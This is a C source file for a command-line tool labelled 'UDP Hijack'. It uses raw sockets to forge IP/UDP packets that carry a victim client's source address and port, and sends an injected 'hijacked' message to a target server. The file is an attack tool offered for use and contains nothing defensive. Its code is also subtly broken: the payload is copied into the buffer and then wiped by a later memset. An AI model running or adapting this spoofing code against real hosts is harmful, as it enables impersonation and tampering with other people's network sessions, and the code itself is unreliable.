//UDP Hijack

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>

#define PACKET_SIZE 4096

// UDP Pseudo Header (For Checksum Calculation)
struct pseudo_header {
    u_int32_t src_addr;
    u_int32_t dst_addr;
    u_int8_t reserved;
    u_int8_t protocol;
    u_int16_t udp_length;
};

// Checksum Calculation Function
unsigned short checksum(void *b, int len) {
    unsigned short *buf = b;
    unsigned int sum = 0;
    unsigned short result;

    for (sum = 0; len > 1; len -= 2)
        sum += *buf++;

    if (len == 1)
        sum += *(unsigned char *)buf;

    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    result = ~sum;
    return result;
}

// Function to Inject a Spoofed UDP Packet
void send_spoofed_udp(char *target_ip, int target_port, char *victim_ip, int victim_port) {
    int sock;
    struct sockaddr_in target_addr;
    char packet[PACKET_SIZE];

    // Create a Raw Socket
    if ((sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) < 0) {
        perror("Socket creation failed");
        exit(1);
    }

    // Set Socket Option to Include IP Header
    int one = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("setsockopt failed");
        exit(1);
    }

    // Pointers to Packet Structures
    struct iphdr *ip = (struct iphdr *)packet;
    struct udphdr *udp = (struct udphdr *)(packet + sizeof(struct iphdr));
    char *data = (char *)(packet + sizeof(struct iphdr) + sizeof(struct udphdr));

    // Prepare the Fake Data Payload
    char fake_message[] = "This is a hijacked UDP message!";
    int data_len = strlen(fake_message);
    strcpy(data, fake_message);

    memset(packet, 0, PACKET_SIZE);

    // Fill IP Header
    ip->version = 4;
    ip->ihl = 5;
    ip->tos = 0;
    ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + data_len);
    ip->id = htonl(54321);
    ip->frag_off = 0;
    ip->ttl = 64;
    ip->protocol = IPPROTO_UDP;
    ip->check = 0;
    ip->saddr = inet_addr(victim_ip);  // Spoofed source (pretend to be the client)
    ip->daddr = inet_addr(target_ip);  // Target (server)

    // Fill UDP Header
    udp->source = htons(victim_port);  // Spoofed Source Port (same as real client)
    udp->dest = htons(target_port);
    udp->len = htons(sizeof(struct udphdr) + data_len);
    udp->check = 0;  // UDP checksum optional

    // Fill Pseudo Header for Checksum Calculation
    struct pseudo_header psh;
    psh.src_addr = inet_addr(victim_ip);
    psh.dst_addr = inet_addr(target_ip);
    psh.reserved = 0;
    psh.protocol = IPPROTO_UDP;
    psh.udp_length = htons(sizeof(struct udphdr) + data_len);

    // Compute Checksum
    char pseudo_packet[sizeof(struct pseudo_header) + sizeof(struct udphdr) + data_len];
    memcpy(pseudo_packet, &psh, sizeof(struct pseudo_header));
    memcpy(pseudo_packet + sizeof(struct pseudo_header), udp, sizeof(struct udphdr) + data_len);
    udp->check = checksum(pseudo_packet, sizeof(pseudo_packet));

    // Destination Address
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(target_port);
    target_addr.sin_addr.s_addr = inet_addr(target_ip);

    // Send Spoofed UDP Packet
    if (sendto(sock, packet, ntohs(ip->tot_len), 0, (struct sockaddr *)&target_addr, sizeof(target_addr)) < 0) {
        perror("Failed to send packet");
    } else {
        printf("Spoofed UDP packet sent from %s:%d -> %s:%d\n", victim_ip, victim_port, target_ip, target_port);
    }

    close(sock);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        printf("Usage: %s <Target IP> <Target Port> <Victim IP> <Victim Port>\n", argv[0]);
        return 1;
    }

    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    char *victim_ip = argv[3];
    int victim_port = atoi(argv[4]);

    printf("Hijacking UDP communication...\n");
    send_spoofed_udp(target_ip, target_port, victim_ip, victim_port);

    return 0;
}
